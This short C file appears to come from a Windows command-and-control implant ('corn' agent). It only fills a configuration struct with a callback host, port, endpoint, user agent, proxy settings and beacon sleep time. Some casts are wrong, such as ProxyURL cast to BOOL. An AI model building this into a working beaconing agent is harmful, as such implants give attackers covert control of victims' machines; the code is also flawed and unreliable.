#include "corn.h"
#include "agent_config.h"
#include <windows.h>

CONFIG_CORN corn_config = {0}; // initial

int SetupAgentConfig(void){
    corn_config.AgentID = (PCHAR)initUUID;
    corn_config.HostName = (PWCHAR)hostname;
    corn_config.HttpPort = (DWORD)httpport;
    corn_config.HttpMethod = (PWCHAR)httpmethod;
    corn_config.EndPoint = (PWCHAR)endpoint;
    corn_config.UserAgent = (PWCHAR)useragent;
    corn_config.IsSSL = (BOOL)isssl;
    corn_config.IsProxyEnabled = (BOOL)proxyenabled;
    corn_config.ProxyURL = (BOOL)proxyurl;
    corn_config.SleepTime = (UINT32)sleeptime;
}

int main(void){
    SetupAgentConfig();
}

